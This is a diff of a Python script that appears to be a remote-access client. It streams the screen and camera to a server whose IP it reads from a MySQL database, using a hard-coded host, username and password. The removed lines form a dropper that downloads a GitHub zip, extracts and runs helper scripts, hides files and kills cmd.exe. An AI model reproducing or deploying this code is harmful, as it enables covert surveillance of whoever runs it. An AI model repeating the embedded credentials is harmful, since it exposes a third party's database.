@@ -1,9 +1,8 @@
-import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui, pymysql
+import socket, os, shutil, time, subprocess, requests, pyautogui, pymysql, modif, scripter
 from vidstream import ScreenShareClient, CameraClient; from turtle import left
 from multiprocessing import Process
 time.sleep(5)
-url = "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip"
-content, co = "IP", ["mysql-lyceestvincent.alwaysdata.net", "116313_msebille", "CMn674pgtFyMKdjPeFLR", "lyceestvincent_msebille"]
+content, co, url = "IP", ["mysql-lyceestvincent.alwaysdata.net", "116313_msebille", "CMn674pgtFyMKdjPeFLR", "lyceestvincent_msebille"], "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip"
 def getpath(change=False):
     if change in (False, "not", "\\"):          return os.getcwd()
     else:                                       return os.getcwd().replace('\\', '/')
@@ -35,48 +34,7 @@ def select(connexion="", tableName="", content="", where=""):
         return False
 def getServerIp():
     return "".join(("".join(("".join(("".join((str(select(co, "test", content))).split("("))).split("'"))).split(","))).split(")"))
-def downloadFileGithub(file_url, data=".zip"):
-    with open(data,"wb") as zip	: 
-        for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
-             # writing one chunk at a time to zip file 
-             if chunk: zip.write(chunk)
-    unzipfile()
-
-def unzipfile(file=".zip"):
-    # ouvrir le fichier zip en mode lecture
-    with zipfile.ZipFile(file, 'r') as zip: 
-        # extraire tous les fichiers
-        zip.extractall() 
-    os.remove(file)
-
-def sortNameFile(data):
-    from os.path import isfile, join
-    return [f for f in os.listdir(data) if isfile(join(data, f))]
-
-def moveFileFromDir(data, file):
-    if type(file)==str:
-        file = file.split()
-    for f in range(len(file)):
-        if file[f] != getFileName():
-            shutil.copy(getpath(True)+"/"+data+"/"+file [f], getpath(True))
-
-tryit = False
-while tryit == False:
-    try: 
-        import modif, scripter
-        tryit = True
-        subprocess.Popen("taskkill /IM cmd.exe /F")
-    except:
-        listfile, dir = ["modif.pyw", "scripter.pyw"], getNameDir(url)
-        downloadFileGithub(url)
-        moveFileFromDir(dir, listfile)
-        time.sleep(0.5)
-        supDir(dir)
-        time.sleep(0.5)
-        os.system(getFileName())
-        modif.hiddenFiles()
-        time.sleep(2)
-
+    
 def receive():
     try:
         client.settimeout(120)
@@ -187,7 +145,7 @@ run, ossys = True, False
 while run == True:
     try:
         sortir, ipScreen, port = False, getServerIp(), 22228
-        
+        print(ipScreen)
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect((ipScreen, 22223))
         ip = s.getsockname()[0]
